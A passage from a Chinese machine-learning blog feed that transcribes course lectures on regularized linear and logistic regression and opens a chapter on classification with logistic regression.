$\theta_0$ 的更新 分离出来 剩下的这些参数$\theta_1$, $\theta_2$ 到$\theta_n$的更新 作为另一部分 所以 这样做其实没有什么变化 对吧？  这只是把 $\theta_0$的更新 和 $\theta_1$ $\theta_2$ 到 $\theta_n$ 的更新分离开来  我这样做的原因是 你可能还记得 对于正则化的线性回归<br>1:32<br>我们惩罚参数$\theta_1$  $\theta_2$…一直到 $\theta_n$ 但是我们不惩罚$\theta_0$ 所以 当我们修改这个 正则化线性回归的算法时 我们将对 $\theta_0$ 的方式将有所不同</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193024.png" alt></p><ul><li>具体地说 如果我们 要对这个算法进行 修改 并用它 求解正则化的目标函数 我们 需要做的是 把下边的这一项做如下的修改 我们要在这一项上添加一项: $\lambda$ 除以 $m$ 再乘以 $\theta_j$ 如果这样做的话 那么你就有了 用于最小化 正则化代价函数 $J(\theta)$ 的梯度下降算法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193037.png" alt></p><ul><li>我不打算用 微积分来证明这一点 但如果你看这一项 方括号里的这一项 如果你知道微积分 应该不难证明它是  $J(\theta)$ 对 $\theta_j$ 的偏导数 这里的 $J(\theta)$ 是用的新定义的形式 它的定义中 包含正则化项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193047.png" alt></p><ul><li>而另一项 上面的这一项 我用青色的方框 圈出来的这一项 这也一个是偏导数 是  $J(\theta)$对 $\theta_0$ 的偏导数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193103.png" alt></p><ul><li>如果你仔细看 $\theta_j$ 的更新 你会发现一些 有趣的东西 具体来说$\theta_j$的每次更新 都是 $\theta_j$ 自己减去 $\alpha$ 乘以原来的无正则项 然后还有这另外的一项 这一项的大小也取决于 $\theta_j$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193117.png" alt></p><ul><li>所以 如果你 把所有这些 取决于 $\theta_j$ 的合在一起的话 可以证明 这个更新 可以等价地写为 如下的形式</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193128.png" alt></p><ul><li>具体来讲 上面的 $\theta_j$ 对应下面的 $\theta_j$ 乘以括号里的1 而这一项是 $\frac{\lambda}{m}$ 还有一个$\alpha$ 把它们合在一起 所以你最终得到 $\alpha\frac{\lambda}{m}$ 然后合在一起 乘以 $\theta_j$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193137.png" alt></p><ul><li>而这一项  $1-\alpha\frac{\lambda}{m}$ 很有意思 具体来说 这一项 $1-\alpha\frac{\lambda}{m}$ 这一项的值 通常 <strong>是一个具体的实数 而且小于1</strong>  对吧？由于 $\alpha\frac{\lambda}{m}$ 通常情况下是正的 如果你的学习速率小 而 $m$ 很大的话 $1-\alpha\frac{\lambda}{m}$  这一项通常是很小的 所以这里的一项 一般来说将是一个比1小一点点的值 所以我们可以把它想成 一个像0.99一样的数字</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193149.png" alt></p><ul><li>所以 对 $\theta_j$ 更新的结果 我们可以看作是 被替换为 $\theta_j$  的0.99倍 也就是  $\theta_j$ 乘以0.99 把  $\theta_j$ 向 0 压缩了一点点 所以这使得  $\theta_j$小了一点 更正式地说  $\theta_j$ 的平方 更小了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193208.png" alt></p><ul><li>另外 这一项后边的第二项 这实际上 与我们原来的 梯度下降更新完全一样 跟我们加入了正则项之前一样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193221.png" alt></p><ul><li>好的 现在你应该对这个 梯度下降的更新没有疑问了 当我们使用正则化线性回归时 我们需要做的就是 在每一个被正规化的参数 $\theta_j$ 上 乘以了一个 比1小一点点的数字 也就是把参数压缩了一点 然后 我们执行跟以前一样的更新</li></ul><p>当然 这仅仅是 从直观上认识 这个更新在做什么 从数学上讲 它就是带有正则化项的 $J(\theta)$ 的梯度下降算法 我们在之前的幻灯片 给出了定义</p><ul><li>梯度下降只是 我们拟合线性回归模型的两种算法 的其中一个 第二种算法是 使用<code>正规方程</code> 我们的做法 是建立这个 设计矩阵 X 其中每一行 对应于一个单独的训练样本 然后创建了一个向量 y  是一个  m 维的向量 包含了所有训练集里的标签 所以 X 是一个 m × (n+1) 维矩阵 y 是一个 m 维向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193231.png" alt></p><ul><li>为了最小化代价函数 $J$ 我们发现 一个办法就是 一个办法就是 让 $\theta$ 等于这个式子 即 X 的转置乘以 X 再对结果取逆 再乘以 X 的转置乘以Y 我在这里留点空间 等下再填满</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193241.png" alt></p><ul><li>这个 $\theta$ 的值 其实就是最小化 代价函数 $J(\theta)$ 的$\theta$值 这时的代价函数J(θ)没有正则项 现在如果我们用了是正则化 我们想要得到最小值   我们来看看应该怎么得到</li><li>推导的方法是 取 $J$ 关于各个参数的偏导数 并令它们 等于0 然后做些 数学推导 你可以 得到这样的一个式子 它使得代价函数最小</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193252.png" alt></p><ul><li>具体的说 如果你 使用正则化 那么公式要做如下改变 括号里结尾添这样一个矩阵 0 1 1 1 等等 直到最后一行 所以这个东西在这里是 一个矩阵 它的左上角的元素是0 其余对角线元素都是1 剩下的元素也都是 0</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193309.png" alt></p><ul><li>可以举一个例子 如果 n 等于2 那么这个矩阵 将是一个3 × 3 矩阵 更一般地情况 该矩阵是 一个 (n+1) × (n+1) 维的矩阵</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193317.png" alt></p><ul><li><p>因此 n 等于2时 矩阵看起来会像这样 左上角是0 然后其他对角线上是1 其余部分都是0 同样地 我不打算对这些作数学推导 坦白说这有点费时耗力 但可以证明 如果你采用新定义的 $J(\theta)$  包含正则项的目标函数 那么这个计算 $\theta$ 的式子 能使你的 $J(\theta)$ 达到全局最小值</p></li><li><p>所以最后 我想快速地谈一下不可逆性的问题 这部分是比较高阶的内容 所以这一部分还是作为选学 你可以跳过去 或者你也可以听听 如果听不懂的话 也没有关系 之前当我讲正规方程的时候 我们也有一段选学视频 讲不可逆的问题 所以这是另一个选学内容 可以作为上次视频的补充 可以作为上次视频的补充</p></li><li><p>现在考虑 <strong>m 即样本总数 小与或等于特征数量 n</strong> 如果你的样本数量 比特征数量小的话 那么这个矩阵 X 转置乘以 X 将是 <code>不可逆或奇异的(singluar)</code> 或者用另一种说法是 这个矩阵是<code>退化(degenerate)的</code></p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193328.png" alt></p><ul><li>如果你在 Octave 里运行它 无论如何 你用函数 pinv 取伪逆矩阵 这样计算 理论上方法是正确的 但实际上 你不会得到一个很好的假设 尽管 Ocatve 会 用 pinv 函数 给你一个数值解 看起来还不错 但是 如果你是在一个不同的编程语言中 如果在 Octave 中 你用 inv 来取常规逆 也就是我们要对 X 转置乘以 X 取常规逆 然后在这样的情况下 你会发现 X 转置乘以 X 是奇异的 是不可逆的 即使你在不同的 编程语言里计算 并使用一些 线性代数库 试图计算这个矩阵的逆矩阵 都是不可行的 因为这个矩阵是不可逆的或奇异的</li><li>幸运的是 正规化也 为我们解决了这个问题 具体地说 只要<strong><code>正则参数</code>是严格大于0的</strong> 实际上 可以 证明该矩阵 X 转置 乘以 X 加上 λ 乘以 这里这个矩阵 可以证明 这个矩阵将不是奇异的 即该矩阵将是可逆的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193342.png" alt></p><ul><li>因此 使用正则化还可以 照顾一些 X 转置乘以 X 不可逆的问题  好的 你现在知道了如何实现正则化线性回归 利用它 你就可以 避免过度拟合 即使你在一个相对较小的训练集里有很多特征 这应该可以让你 在很多问题上更好地运用线性回归 在接下来的视频中 我们将 把这种正则化的想法应用到逻辑回归 这样你就可以 让逻辑回归也避免过度拟合 并让它表现的更好</li></ul><h3 id="小小的总结–正则化线性回归"><a href="#小小的总结–正则化线性回归" class="headerlink" title="小小的总结–正则化线性回归"></a>小小的总结–正则化线性回归</h3><p>对于线性回归的求解，我们之前推导了两种学习算法：<strong>一种基于梯度下降，一种基于正规方程</strong>。</p><p>正则化线性回归的代价函数为：</p>$J\left( \theta  \right)=\frac{1}{2m}\sum\limits_{i=1}^{m}{[({{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})}^{2}}+\lambda \sum\limits_{j=1}^{n}{\theta _{j}^{2}})]}$<p>如果我们要使用梯度下降法令这个代价函数最小化，因为我们未对进行正则化，所以梯度下降算法将分两种情形：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215119.png" alt></p><p>对上面的算法中$j=1,2,...,n$ 时的更新式子进行调整可得：</p>${\theta_j}:={\theta_j}(1-a\frac{\lambda }{m})-a\frac{1}{m}\sum\limits_{i=1}^{m}{({h_\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{j}^{\left( i \right)}}$<p>可以看出，正则化线性回归的梯度下降算法的变化在于，<strong>每次都在原有算法更新规则的基础上令$\theta$值减少了一个额外的值</strong>。</p><p>我们同样也可以利用<code>正规方程</code>来求解正则化线性回归模型，方法如下所示：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215128.png" alt></p><p>图中的矩阵尺寸为$(n+1)*(n+1)$。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215136.png" alt></p><h2 id="7-4-正则化的逻辑回归模型"><a href="#7-4-正则化的逻辑回归模型" class="headerlink" title="7.4 正则化的逻辑回归模型"></a>7.4 正则化的逻辑回归模型</h2><ul><li>针对逻辑回归问题  我们在之前的课程已经学习过两种优化算法 我们首先学习了 使用梯度下降法来优化代价函数 $J(\theta)$ 接下来学习了 更高级的优化算法 这些高级优化算法 需要你自己设计 代价函数  $J(\theta)$ 自己计算导数 在本节课中 我们将展示 如何改进梯度下降法和 高级优化算法 使其能够应用于 正则化的逻辑回归 接下来我们来学习其中的原理</li><li>在之前的课程中我们注意到 对于逻辑回归问题 有可能会出现过拟合的现象 如果你使用了 类似这样的高阶多项式 g 是 S 型函数 具体来说 最后你会得到这样的结果  分类边界看起来是一个 过于复杂并且 十分扭曲的函数 针对这个训练集 这显然不是一个好的结果</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193420.png" alt></p><ul><li>通常情况下 如果要解决的逻辑回归问题有很多参数 并且又用了过多的多项式项 这些项大部分都是没有必要的 最终都可能出现过拟合的现象</li><li>这是逻辑回归问题的代价函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193400.png" alt></p><ul><li>为了将其修改为正则化形式  我们只需要在后面增加一项  加上 $\frac{\lambda}{2m}$ 再跟过去一样 这个求和将 j 从1开始 而不是从0开始 累积 $\theta_j$的平方 增加的这一项 将惩罚参数 θ1, θ2 等等 一直到 θn 防止这些参数取值过大</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193411.png" alt></p><ul><li>增加了这一项之后 产生的效果是 即使用有很多参数的 高阶多项式来拟合 只要使用了正则化方法 约束这些参数使其取值很小 你仍有可能得到一条 看起来是这样的分类边界 显然  这条边界更合理地 分开了正样本和负样本</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193431.png" alt></p><ul><li>因此  在使用了正则化方法以后 即使你的问题有很多参数 正则化方法可以帮你 避免过拟合的现象 这到底是怎样实现的呢？</li><li>首先看看以前学过的梯度下降法 这是我们之前得到的更新式 我们利用这个式子 迭代更新 $\theta_j$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193442.png" alt></p><ul><li>这一页幻灯片看起来和上一节课的线性回归问题很像 但是这里我将 $\theta_0$ 的更新公式单独写出来 第一行用来更新 $\theta_0$  第二行用来更新 $\theta_1$ 到 $\theta_n$  ,将 $\theta_0$ 单独处理</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193449.png" alt></p><ul><li>为了按照 正则化代价函数的形式 来修改算法 接下来的推导 非常类似于 上一节学习过的正则化线性回归 只需要将第二个式子 修改成这样</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193459.png" alt></p><ul><li>我们又一次发现 修改后的式子表面上看起来 与上一节的线性回归问题很相似 但是实质上这与 我们上节学过的算法并不一样 因为现在的假设 h(x) 是按照下面式子定义的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193512.png" alt></p><ul><li>这与上一节正则化线性回归算法 中的定义并不一样 由于假设的不同 我写下的迭代公式 只是表面上看起来很像 上一节学过的 正则化线性回归问题中的梯度下降算法</li><li>总结一下 方括号中的这一项是 新的代价函数 $J(\theta)$ 关于 $\theta_j$ 的偏导数  这里的 $J(\theta)$ 是我们在上一页幻灯片中 定义的 使用了正则化的代价函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193520.png" alt></p><ul><li>以上就是正则化逻辑回归问题的梯度下降算法 接下来我们讨论 如何在更高级的优化算法中 使用同样的 正则化技术 提醒一下 对于这些高级算法 我们需要自己定义 costFuntion 函数 这个函数有一个输入参数 向量 theta 的内容是这样的 我们的参数索引依然从0开始 即 θ0 到 θn 但是由于 Octave 中 向量索引是从1开始 我们的参数是从 θ0 到 θn 在 Octave 里 是从 theta(1) 开始标号的 而 θ1 将被记为 theta(2) 以此类推 直到 θn 被记为</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193631.png" alt></p><ul><li>而我们需要做的 就是将这个自定义代价函数 这个 costFunction 函数  代入到我们之前学过的 fminunc函数中 括号里面是 @costFunction 将 @costFunction 作为参数代进去 等等  fminunc返回的是 函数 costFunction 在无约束条件下的最小值</li><li>因此  这个式子 将求得代价函数的最小值  因此 costFunction 函数 有两个返回值 第一个是 jVal 为此  我们要在这里 补充代码 来计算代价函数 J(θ)</li><li>由于我们在这使用的是正则化逻辑回归 因此 代价函数 J(θ) 也相应需要改变 具体来说 代价函数需要 增加这一正则化项 因此  当你在计算 J(θ) 时 需要确保包含了最后这一项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193534.png" alt></p><ul><li>另外 代价函数的 另一项返回值是 对应的梯度导数 梯度的第一个元素 gradient(1) 就等于 J(θ) 关于 θ0 的偏导数  梯度的第二个元素按照这个式子计算 剩余元素以此类推 再次强调 向量元素索引是从1开始 这是因为 Octave 的向量索引 就是从1开始的</li><li>再来总结一下 首先看第一个公式 在之前的课程中 我们已经计算过它等于这个式子 这个式子没有变化 因为相比没有正则化的版本 J(θ) 关于 θ0 的偏导数不会改变</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193550.png" alt></p><ul><li>但是其他的公式确实有变化 以 θ1 的偏导数为例 在之前的课程里我们也计算过这一项 它等于这个式子 加上 λ 除以 m  再乘以 θ1 注意要确保这段代码编写正确 建议在这里添加括号 防止求和符号的作用域扩大</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193602.png" alt></p><ul><li>类似的 再来看这个式子 相比于之前的幻灯片 这里多了额外的一项 这就是正则化后的 梯度计算方法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193612.png" alt></p><ul><li>当你自己定义了 costFunction 函数 并将其传递到 fminuc 或者其他类似的高级优化函数中 就可以求出 这个新的正则化代价函数的极小值 而返回的参数值 即是对应的 逻辑回归问题的正则化解 讲到这里  你应该已经学会了 解决正则化逻辑回归问题的方法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190212193620.png" alt></p><ul><li>你知道吗 我住在硅谷 当我在硅谷晃悠时 我看到许多工程师 运用机器学习算法 给他们公司挣来了很多金子 课讲到这里 大家对机器学习算法可能还只是略懂 但是一旦你精通了 线性回归、高级优化算法 和正则化技术 坦率地说 你对机器学习的理解 可能已经比许多工程师深入了 现在  你已经有了 丰富的机器学习知识 目测比那些硅谷工程师还厉害 而那些工程师都混得还不错 给他们公司挣了大钱 你懂的 或者用机器学习算法来做产品 所以 恭喜你 你已经历练得差不多了 已经具备足够的知识 足够将这些算法 用于解决实际问题 所以你可以小小的骄傲一下了 但是 我还是有很多可以教你们的 我还是有很多可以教你们的 接下来的课程中 我们将学习 一个非常强大的非线性分类器 无论是线性回归问题 还是逻辑回归问题 都可以构造多项式来解决 但是 你将逐渐发现还有 更强大的非线性分类器 可以用来解决多项式回归问题 在下一节课 我将向大家介绍它们 你将学会 比你现在解决问题的方法 强大N倍的学习算法</li></ul><h3 id="小小的总结–正则化的逻辑回归模型"><a href="#小小的总结–正则化的逻辑回归模型" class="headerlink" title="小小的总结–正则化的逻辑回归模型"></a>小小的总结–正则化的逻辑回归模型</h3><p>针对逻辑回归问题，我们在之前的课程已经学习过两种优化算法：我们首先学习了使用梯度下降法来优化代价函数$J\left( \theta  \right)$，接下来学习了更高级的优化算法，这些高级优化算法需要你自己设计代价函数$J\left( \theta  \right)$。自己计算导数.</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215145.png" alt></p><p>同样对于逻辑回归，我们也给代价函数增加一个正则化的表达式，得到代价函数：</p>$J\left( \theta  \right)=\frac{1}{m}\sum\limits_{i=1}^{m}{[-{{y}^{(i)}}\log \left( {h_\theta}\left( {{x}^{(i)}} \right) \right)-\left( 1-{{y}^{(i)}} \right)\log \left( 1-{h_\theta}\left( {{x}^{(i)}} \right) \right)]}+\frac{\lambda }{2m}\sum\limits_{j=1}^{n}{\theta _{j}^{2}}$<p>Python代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">costReg</span><span class="token punctuation">(</span>theta<span class="token punctuation">,</span> X<span class="token punctuation">,</span> y<span class="token punctuation">,</span> learningRate<span class="token punctuation">)</span><span class="token punctuation">:</span>    theta <span class="token operator">=</span> np<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>theta<span class="token punctuation">)</span>    X <span class="token operator">=</span> np<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>X<span class="token punctuation">)</span>    y <span class="token operator">=</span> np<span class="token punctuation">.</span>matrix<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    first <span class="token operator">=</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span><span class="token operator">-</span>y<span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>sigmoid<span class="token punctuation">(</span>X<span class="token operator">*</span>theta<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    second <span class="token operator">=</span> np<span class="token punctuation">.</span>multiply<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> sigmoid<span class="token punctuation">(</span>X<span class="token operator">*</span>theta<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    reg <span class="token operator">=</span> <span class="token punctuation">(</span>learningRate <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> len<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>np<span class="token punctuation">.</span>power<span class="token punctuation">(</span>theta<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span>theta<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>first <span class="token operator">-</span> second<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> reg</code></pre><p>要最小化该代价函数，通过求导，得出梯度下降算法为：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215157.png" alt></p><p>注：看上去同线性回归一样，但是知道 ${h_\theta}\left( x \right)=g\left( {\theta^T}X \right)$，所以与线性回归不同。<br>Octave 中，我们依旧可以用 <code>fminuc</code> 函数来求解代价函数最小化的参数，值得注意的是参数${\theta_{0}}$的更新规则与其他情况不同。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104215205.png" alt></p><p>注意：</p><ol><li><p>虽然正则化的逻辑回归中的梯度下降和正则化的线性回归中的表达式看起来一样，但由于两者的${h_\theta}\left( x \right)$不同所以还是有很大差别。</p></li><li>${\theta_{0}}$不参与其中的任何一个正则化。</li></ol><p>目前大家对机器学习算法可能还只是略懂，但是一旦你精通了线性回归、高级优化算法和正则化技术，坦率地说，你对机器学习的理解可能已经比许多工程师深入了。现在，你已经有了丰富的机器学习知识，目测比那些硅谷工程师还厉害，或者用机器学习算法来做产品。</p><p>接下来的课程中，我们将学习一个非常强大的非线性分类器，无论是线性回归问题，还是逻辑回归问题，都可以构造多项式来解决。你将逐渐发现还有更强大的非线性分类器，可以用来解决多项式回归问题。我们接下来将将学会，比现在解决问题的方法强大N倍的学习算法。</p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第六章-逻辑回归(Logistic-Regression)</title>
      <link href="/2019/02/12/di-liu-zhang-luo-ji-hui-gui-logistic-regression/"/>
      <url>/2019/02/12/di-liu-zhang-luo-ji-hui-gui-logistic-regression/</url>
      
        <content type="html"><![CDATA[<h1 id="第六章-逻辑回归-Logistic-Regression"><a href="#第六章-逻辑回归-Logistic-Regression" class="headerlink" title="第六章 逻辑回归(Logistic Regression)"></a>第六章 逻辑回归(Logistic Regression)</h1><hr><h2 id="6-1-Classification-分类问题"><a href="#6-1-Classification-分类问题" class="headerlink" title="6.1 Classification(分类问题)"></a>6.1 Classification(分类问题)</h2><ul><li><p>从现在及未来,我们开始谈论的分类问题，其中要预测的变量$y$是<code>离散的(discreet valued)</code>。我们将学习一个算法叫<code>Logistic回归</code>，这是当今最流行和最广泛使用的学习算法之一。</p></li><li><p>下面是分类问题的一些例子。之前，我们谈到了<code>电子垃圾邮件分类</code>就是一个分类问题。另一个例子是<code>网上交易的分类</code>问题。如果你有一个卖东西的网站，然后你想知道一次实物的交易是不是欺诈，或者某人是否在使用偷来的信用卡或者是盗用了别的用户的密码。这是另一种分类问题，之前我们也谈到肿瘤分类问题的例子,区别一个肿瘤是恶性的还是良性的。</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128101228.png" alt></p><a id="more"></a><ul><li>在所有的这些问题中，我们需要预测的变量是变量$y$,我们可以认为它能够取两个值，要么是0,要么是1**，要么垃圾邮件要么不是垃圾邮件，欺诈性或不欺诈，恶性或良性。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209171635.png" alt></p><ul><li>标记为<code>0</code>的类还有另一个名字叫做<code>负类(negative class)</code>，标记为<code>1</code>的类，也叫做<code>正类(positive class)</code>。所以，0可能表示良性肿瘤  1也就是说正类可能表示一个恶性肿瘤。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209172053.png" alt></p><ul><li>对于这两种类别的分类，垃圾邮件，或者不是垃圾邮件，等等 将两种类别标记为，正类或负类，0或1是<code>任意的</code>，其实怎样都可以。但是通常从直觉上来讲，<code>负类</code>总是表达<code>缺少某样东西</code>的意思，比如缺少恶性肿瘤，而1<code>正类</code>，就会表示 存在某样我们寻找的东西。但是哪个是负类，哪个是正类的定义，有时是任意的 这一点并不太重要。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209172207.png" alt></p><ul><li>现在，我们要开始研究只有两类 0和1的分类问题。稍后，我们将讨论多类别问题 多类别问题中的变量$y$ 的取值可以是0 1 2和3 或者更多。这就是所谓的多类分类问题，但是在接下来的几个视频中，让我们从两类分类问题 或者叫二元分类问题开始 我们以后再关心多类的问题</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209172103.png" alt></p><ul><li>那么，我们应该如何建立一个分类算法？下面是一个训练集的例子 这个训练集是用来 给一个肿瘤分类为恶性或者良性的，注意 这个恶性值(malignancy) 只取两个值 0也就是<code>非(恶性)</code>和1也即是 <code>是(恶性)</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209172130.png" alt></p><ul><li>所以 拿到这个训练集 我们可以做的一个事情是 将一个我们已知的算法 线性回归用于这组数据 尝试用一条直线来拟合数据<br>所以如果用一条直线拟合这个训练集 你有可能得到 看起来像这样的假设函数。好了，所以这是我的假设函数$h_\theta(x)$ 等于 $\theta$ 的转置乘以$X$。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209172121.png" alt></p><ul><li>如果你想进行预测，你可以尝试将<strong>分类器的输出阈值设为0.5</strong>。这是纵轴上0.5的位置。 如果假设输出的值，大于等于0.5 你就预测$y$值等于1。如果小于0.5，你就预测$y$等于0。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209172138.png" alt></p><ul><li>让我们看看，当我们这样做的时候会发生什么。所以，让我们取<code>0.5</code>，这就是阈值的位置。就这样使用线性回归算法,这个点(粉红色点)右边的所有点 我们会将它们全部预测为正类 因为它们的输出值都是大于0.5 在这一点的左侧的所有点，我们会预测它们全部为负。在这个特定的例子中，看起来好像线性回归所做的实际上是合理的 尽管我们感兴趣的是一个分类问题</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128193514.png" alt></p><ul><li>现在我们把问题稍微改一下。让我来延长一下横轴 假如说新增一个训练样本 在很远的右边那里  注意 这个额外的训练样本在这里，它实际上并没有改变什么，对不对？<strong>先看回之前的训练集</strong>，可以清晰看到这条直线是个好的hypothesis(假设函数)。好了，在这一点(横轴上的粉红色点)的右边所有点，我们应该预测为<code>正</code>，左边所有点，我们应该预测为<code>负</code> 因为对于这个训练集来说,所有肿瘤大小比中间的大的都是恶性的,比中间的小的都不是恶性的，至少在这个训练集中是这样子的。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128194453.png" alt></p><ul><li>但是一旦我们在最右边这里增加了一个额外的训练样本，如果你现在运行线性回归算法，你不会得到一条拟合数据的直线。这可能是这样的蓝色直线</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128195625.png" alt></p><ul><li>如果你现在将输出阈值设置为0.5，那么这个阈值点应该在蓝色那点上</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128195835.png" alt></p><ul><li>所以，在这点右边的所有点，你将预测为正，在这点左边的所有点,你将预测为负。然而,看起来这次试用线性回归算法得到了一个很坏的结果，对吧？因为，你知道，这些都是我们正的例子，这些都是我们的负的例子。这是很清楚的.</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128200124.png" alt></p><ul><li>我们正确的划分应该在这里(蓝线)</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128200220.png" alt></p><ul><li>但不知何故在右边增加了一个训练样本，一个没有给我们更多新信息的训练样本 当然,对于这个假设函数来说 学习出了这个新增加的例子是恶性的 但不知何故，在那里新增加的训练样本引起了线性回归的直线拟合,该直线的拟合发生改变 从这个洋红色线条 变成了这个蓝线在这里，从而造成它给我们一个更坏的假设。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128200905.png" alt></p><ul><li>因此，应用线性回归到一个分类问题通常不是一个好主意。在第一个例子中,以我添加这个额外的训练例子为例，在添加之前,这个线性回归很巧合的，我们得到了一个运作良好假设  但通常给一个训练集使用线性回归，当然,你可能刚好巧合，但通常它不是一个好的想法，所以我不会对分类问题使用线性回归。</li><li>接下来是另外一个关于如果我们用线性回归处理分类问题会发生的有趣的事情。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181128201557.png" alt></p><ul><li>对于分类，我们知道，Y是0或1，但如果您使用的是线性回归，假设输出的值可能或远大于1或远小于0，即使所有好的训练样本都有标签Y 等于0或1  即使我们知道有标签为0或1，如果算法得出的结果比1大得多或者比0小得多 这似乎有点怪 所以，我们接下来的几个视频是学习所谓的<code>逻辑回归算法</code> 它具有一种输出的属性，就是逻辑回归预测的结果总是0和1之间，并不会大于1或小于零</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181129001517.png" 